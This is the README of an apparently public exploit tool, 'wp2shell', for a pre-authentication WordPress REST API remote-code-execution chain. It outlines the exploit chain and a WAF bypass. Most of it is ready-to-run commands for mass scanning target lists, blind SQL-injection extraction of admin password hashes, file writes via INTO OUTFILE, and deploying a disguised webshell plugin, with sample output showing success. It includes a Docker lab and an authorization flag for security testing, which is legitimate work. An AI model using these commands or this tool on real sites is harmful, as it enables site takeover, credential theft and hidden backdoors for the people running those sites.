# wp2shell

> **中文概要** | [English README ↓](#wp2shell-1)

预认证 WordPress Core REST API 远程代码执行漏洞利用工具（CVE-2026-63030 + CVE-2026-60137，CVSS 9.8）。由 Adam Kues（Assetnote / Searchlight Cyber）发现，SQLi 同时致谢 TF1T、dtro、haongo。

- **完整 RCE 链**：WordPress 6.9.0–6.9.4 和 7.0.0–7.0.1
- **仅 SQLi 接收器**（需 facilitating 插件/主题）：6.8.0–6.8.5
- **已修复**：6.8.6 / 6.9.5 / 7.0.2

本工具 Fork 自 [ThomasNJordan/wp2shell](https://github.com/ThomasNJordan/wp2shell)（原始 PoC，作者 Thomas Jordan / st4ndard），在原始 PoC 基础上进行了大量增强：

- **内容型布尔盲注**（默认）：基于 HTTP 响应主体帖子数量做确定性 True/False 判定，无需 SLEEP 延迟，本地 10 秒内完成 34 字符 hash 提取
- **版本自动检测**：REST API → HTML meta → Feed 三级指纹，自动区分 full_chain / sqli_only / patched
- **批量扫描**：`-f hosts.txt` + `-t 10` 多线程并发
- **取证证据**：`--proof` 提取 `@@version` + `current_user()`
- **远程安全守卫**：`--authorized` 强制远程授权确认
- **重定向安全**：301/302 保持 POST body，cdn/waf 环境下更可靠
- **UNION SELECT INTO OUTFILE**：快速文件写入路径（需 MySQL FILE 权限）
- **多路径降级兜底**：UNION OUTFILE → stacked INSERT → legacy OUTFILE → 布尔盲注
- **SLEEP 时序盲注保留**：`--time-based` 作为降级选项
- **Docker 测试环境**：`${WP_TAG}` 参数化，一键切换漏洞/修复版本

---

# wp2shell

Pre-authentication RCE exploit for WordPress Core REST API (CVE-2026-63030 + CVE-2026-60137 | CVSS 9.8).

```
                 ____      _          _ _
 __      ___ __ |___ \ ___| |__   ___| | |
 \ \ /\ / / '_ \  __) / __| '_ \ / _ \ | |
  \ V  V /| |_) |/ __/\__ \ | | |  __/ | |
   \_/\_/ | .__/|_____|___/_| |_|\___|_|_|
          |_|   CVE-2026-63030
```

## Overview

HTTP/HTTPS wp2shell PoC with advanced capabilities for impact demonstration on improperly configured WordPress sites. Forked from [ThomasNJordan/wp2shell](https://github.com/ThomasNJordan/wp2shell) (original PoC by Thomas Jordan / st4ndard), significantly enhanced with techniques from [0xsha/wp2shell](https://github.com/0xsha/wp2shell) and [dinosn/wp2shell-lab](https://github.com/dinosn/wp2shell-lab).

**Affected versions:**

| Classification | Versions | Description |
|---|---|---|
| **Full RCE chain** | 6.9.0–6.9.4, 7.0.0–7.0.1 | CVE-2026-63030 (batch confusion) + CVE-2026-60137 (SQLi) |
| **SQLi sink only** | 6.8.0–6.8.5 | CVE-2026-60137 present, needs facilitating plugin/theme |
| **Fixed** | 6.8.6 / 6.9.5 / 7.0.2 | Patched |

Discovered by Adam Kues (Assetnote / Searchlight Cyber); SQLi also credited to TF1T, dtro, haongo.

**Exploit chain:**
1. Batch-route desync via `$validation`/`$matches` index misalignment
2. Re-entrancy through nested batch dispatch (no `is_dispatching()` guard)
3. SQL injection via unsanitized `author__not_in` string bypass in `WP_Query`
4. Optional CloudFront WAF bypass using `GET + _method=POST` with PHP array params

## Key Enhancements

### Content-Based Boolean Oracle (Default)

Uses response body post count as a deterministic True/False oracle — **no SLEEP required**. Extracts a 34-character bcrypt hash in ~10 seconds locally, vs minutes-to-hours for timing-based approaches.

```
Phase 2: "Confirming SQL injection via nested batch (content-based)..."
Phase 2: "Content oracle verified: 1=1→True, 1=0→False"
```

### Automatic Version Detection

Three-tier fingerprinting (REST API → HTML meta → Feed), classifies targets as `full_chain`, `sqli_only`, or `patched` before exploitation:

```
[+] WordPress version: 6.9.4 — VULNERABLE (full RCE chain)
[!] WordPress version: 6.8.3 — SQLi present but batch confusion NOT reachable
[-] WordPress version: 6.9.5 — patched or out of range
```

### Multi-Path RCE Fallback Chain

```
Phase 3a: UNION SELECT INTO OUTFILE  (fastest — needs MySQL FILE privilege)
Phase 3b: stacked INSERT admin       (fast — needs multi_query, rare)
Phase 3c: legacy subquery OUTFILE    (needs FILE priv + secure_file_priv)
Phase 3d: blind extraction → crack   (slow but works everywhere)
```

### Batch Scanning

```bash
python3 wp2shell.py -f targets.txt --check
python3 wp2shell.py -f targets.txt --check --json --proof -t 20
```

### Forensic Evidence (`--proof`)

Reads `@@version` and `current_user()` from the database as read-only proof:

```bash
python3 wp2shell.py http://target --extract "dummy" --proof
# [+] @@version: 8.0.45
# [+] current_user(): wpuser@%
```

## Usage

```
python wp2shell.py <target> <mode> [options]
python wp2shell.py -f hosts.txt --check [options]    # batch scan
```

### Modes

| Flag | Description |
|------|-------------|
| `--check` | Non-destructive vulnerability probe only |
| `--exploit` | Full pre-auth RCE chain |
| `--shell` | Deploy shell with known admin creds |
| `--cleanup` | Remove deployed webshell |
| `--extract SQL` | Extract data via blind SQLi |

### Options

| Flag | Description | Default |
|------|-------------|---------|
| `--proxy PROXY` | HTTP proxy (e.g. `http://127.0.0.1:8080`) | None |
| `--timeout TIMEOUT` | HTTP timeout in seconds | `30` |
| `--table-prefix PREFIX` | WordPress table prefix | `wp_` |
| `--webroot PATH` | Server webroot for OUTFILE | `/var/www/html` |
| `--shell-key KEY` | Webshell auth key | Random |
| `--admin-user USER` | Admin username (for `--exploit`/`--shell`/`--cleanup`) | Random |
| `--admin-pass PASS` | Admin password (for `--exploit`/`--shell`/`--cleanup`) | Random |
| `--skip-outfile` | Skip SELECT INTO OUTFILE attempt | Off |
| `--no-union-outfile` | Skip UNION SELECT INTO OUTFILE attempt | Off |
| `--no-create-admin` | Skip stacked INSERT admin creation | Off |
| `--sleep DURATION` | SLEEP duration for blind SQLi | `0.15` |
| `--time-based` | Use SLEEP-based timing oracle (fallback) | Off |
| `--skip-version-check` | Skip version detection (use when fingerprint fails) | Off |
| `-f, --file FILE` | File with one target URL per line (# comments ok) | None |
| `-t, --threads N` | Concurrent workers for batch scan | `10` |
| `--authorized` | Assert authorization for remote targets | Off |
| `--json` | Emit JSON output (for batch scan) | Off |
| `--proof` | Read `@@version` + `current_user()` as evidence | Off |
| `-v, --verbose` | Verbose output | Off |

## Examples

```bash
# Check if target is vulnerable (non-destructive)
python wp2shell.py https://target.com --check

# Full exploit chain (content-based oracle, ~10s local)
python wp2shell.py https://target.com --exploit -v

# Full exploit with SLEEP timing fallback (slower, no posts needed)
python wp2shell.py https://target.com --exploit --time-based --sleep 3

# Extract arbitrary data via blind SQLi
python wp2shell.py https://target.com --extract "SELECT user_login FROM wp_users LIMIT 1"

# Read-only forensic evidence
python wp2shell.py https://target.com --extract "dummy" --proof

# Deploy shell with known admin creds
python wp2shell.py https://target.com --shell --admin-user admin --admin-pass password123

# Cleanup deployed webshell
python wp2shell.py https://target.com --cleanup --admin-user admin --admin-pass password123 --shell-key <key>

# Batch scan (non-destructive detection)
python wp2shell.py -f targets.txt --check

# Batch scan with JSON output + forensic evidence
python wp2shell.py -f targets.txt --check --json --proof -t 20

# Remote targets require --authorized
python wp2shell.py https://example.com --check --authorized

# Skip version check when fingerprinting fails
python wp2shell.py https://target.com --exploit --skip-version-check
```

## Requirements

- Python 3.8+
- `requests`

```bash
pip install requests
```

## Lab Environment

A reproducible Docker lab ships with the tool. The compose file is parameterised so you can validate both vulnerable and patched versions with a single command.

### File Structure

```
lab/
├── docker-compose.yml    ← ${WP_TAG} parameterised (default: 6.9.4)
├── Makefile              ← one-command lab lifecycle
└── mysql-init.sql        ← GRANT FILE (only needed for OUTFILE testing)
```

The lab models a **normal/managed host** by default — the DB user has `ALL ON wordpress.*` without global `FILE` privilege, exactly matching production WordPress deployments. The optional `mysql-init.sql` adds `FILE` for UNION SELECT INTO OUTFILE testing.

### Quick Start

```bash
make up          # WordPress 6.9.4 (vulnerable) + MySQL 8.0, port 8889
make check       # non-destructive probe against the lab
make exploit     # full RCE chain
make proof       # forensic evidence extraction (@@version + current_user)
make patched     # tear down, rebuild on WP 7.0.2, re-check
make down        # tear down (removes volumes)

# Custom versions — switch with env vars
WP_TAG=6.9.4 make up      # vulnerable (default)
WP_TAG=7.0.2 make up      # patched
WP_TAG=6.8.3 make up      # SQLi-only branch
WP_PORT=8093 make up      # custom port
```

Default credentials: `admin` / `Admin!2345` (one published post for content oracle).

### FILE Privilege (OUTFILE Testing)

The `mysql-init.sql` grants `FILE ON *.* TO 'wpuser'@'%'` and the compose file mounts `wp_data` as a shared volume into the MySQL container. This lets you verify UNION SELECT INTO OUTFILE in a controlled environment. Remove or comment out the `mysql-init.sql` volume mount to revert to the default no-FILE configuration.

## Verification Examples

All examples below were verified against the local Docker lab (WordPress 6.9.4, MySQL 8.0).

### 1. Version Detection + Non-Destructive Probe

```bash
$ python3 wp2shell.py http://127.0.0.1:8889 --check
  [+] WordPress version: 6.9.4 — VULNERABLE (full RCE chain)
  [+] VULNERABLE - desync confirmed: categories received block-renderer handler
```

### 2. Forensic Evidence Extraction

Read `@@version` and `current_user()` from the database as read-only proof that the SQL injection channel is active:

```bash
$ python3 wp2shell.py http://127.0.0.1:8889 --extract "dummy" --proof
  [+] @@version: 8.0.45
  [+] current_user(): wpuser@%
```

### 3. Full Exploit Chain (Content-Based Oracle, ~10s Local)

```bash
$ python3 wp2shell.py http://127.0.0.1:8889 --exploit -v
  [+] WordPress version: 6.9.4 — VULNERABLE (full RCE chain)
  [+] VULNERABLE - desync confirmed
  [+] Content oracle verified: 1=1→True, 1=0→False
  [+] SQL injection CONFIRMED via nested batch
  [*] Phase 3a: UNION SELECT INTO OUTFILE
  [!] UNION OUTFILE failed (split-query or no FILE priv)
  [*] Phase 3d: Extracting admin credentials via blind SQLi...
  [+] admin_login: admin
  [+] admin_hash: $wp$2y$10$e5Ulmqy.i73t8Kb5IDCsOOS8
```

### 4. Deploy Webshell (Known Credentials)

```bash
$ python3 wp2shell.py http://127.0.0.1:8889 --shell \
    --admin-user admin --admin-pass 'Admin!2345' -v
  [+] Authenticated as admin
  [+] Plugin uploaded
  [+] Webshell verified at http://127.0.0.1:8889/wp-content/plugins/.../wp-health-monitor.php
```

### 5. Batch Scan

```bash
$ echo "http://127.0.0.1:8889" > targets.txt
$ python3 wp2shell.py -f targets.txt --check
  [VULNERABLE] http://127.0.0.1:8889  (WP 6.9.4, full_chain)
  summary: 1 scanned | vulnerable=1  affected=0  not_vuln=0  error=0
```

### 6. Remote Target Authorization Guard

```bash
$ python3 wp2shell.py https://example.com --check
  [-] Remote target requires --authorized.
  [!] Only test assets you own or are explicitly authorized.
```

### 7. Validate the Fix (Patched Version)

```bash
$ make patched
  WordPress 7.0.2 installed
$ python3 wp2shell.py http://127.0.0.1:8889 --check
  [-] WordPress version: 7.0.2 — patched or out of range
```

## Credits

- Original PoC: [ThomasNJordan/wp2shell](https://github.com/ThomasNJordan/wp2shell) (Thomas Jordan / st4ndard)
- Unified PoC techniques: [0xsha/wp2shell](https://github.com/0xsha/wp2shell)
- Detector design & lab patterns: [dinosn/wp2shell-lab](https://github.com/dinosn/wp2shell-lab)
- Vulnerability discovery: Adam Kues (Assetnote / Searchlight Cyber)
- SQLi credit: TF1T, dtro, haongo

## License

MIT — for authorized security testing only.
